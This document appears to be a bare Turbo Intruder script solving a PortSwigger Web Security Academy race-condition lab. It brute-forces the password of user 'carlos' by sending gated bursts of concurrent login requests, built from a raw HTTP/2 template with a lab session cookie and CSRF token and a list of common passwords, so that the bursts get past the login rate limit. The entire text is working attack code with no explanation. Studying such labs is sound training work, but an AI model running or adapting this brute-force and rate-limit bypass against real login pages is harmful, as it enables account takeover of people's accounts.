RACE CONDITIONS

import random

def shufflePasswords(passwords):

    passwords = [
        p.strip()
        for p in passwords.splitlines()
        if p.strip()
    ]

    random.shuffle(passwords)

    return passwords


def chunkList(lst, chunk_size):

    return [
        lst[i:i + chunk_size]
        for i in range(0, len(lst), chunk_size)
    ]

def splitInTwo(lst):

    middle = len(lst) // 2

    return [
        lst[middle:],
        lst[:middle]    
    ]

    
req_template = """POST /login HTTP/2
Host: 0aa700d604687dac83e78c3d00cf00af.web-security-academy.net
Cookie: session=Vd6rdT8USBLhZSZfEOHw5KD7IRsQT6g4
Content-Length: 70
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-ES,es;q=0.9
Origin: https://0aa700d604687dac83e78c3d00cf00af.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa700d604687dac83e78c3d00cf00af.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=w6SjSSt6uROUAZ0KhXtcNp7rjjOePrLe&username=%s&password=%s
"""

passwords= """
123123
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
1234567890
michael
x654321
superman
1qaz2wsx
baseball
7777777
121212
000000
"""

all_passwords = shufflePasswords(passwords)

password_groups = splitInTwo(all_passwords)

def getPasswords(group):
    for password in group:
        sanitized_password = password.strip()

        if sanitized_password:
            yield sanitized_password

def queueRequests(target, wordlists):

    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    for i, group in enumerate(password_groups):

        gate_name = "gate%s" % i

        for password in getPasswords(group):

            req = req_template % ("carlos", password)

            engine.queue(
                req,
                gate=gate_name
            )

        print("Opening", gate_name)

        engine.openGate(gate_name)

        time.sleep(70)

def handleResponse(req, interesting):
    table.add(req)
        

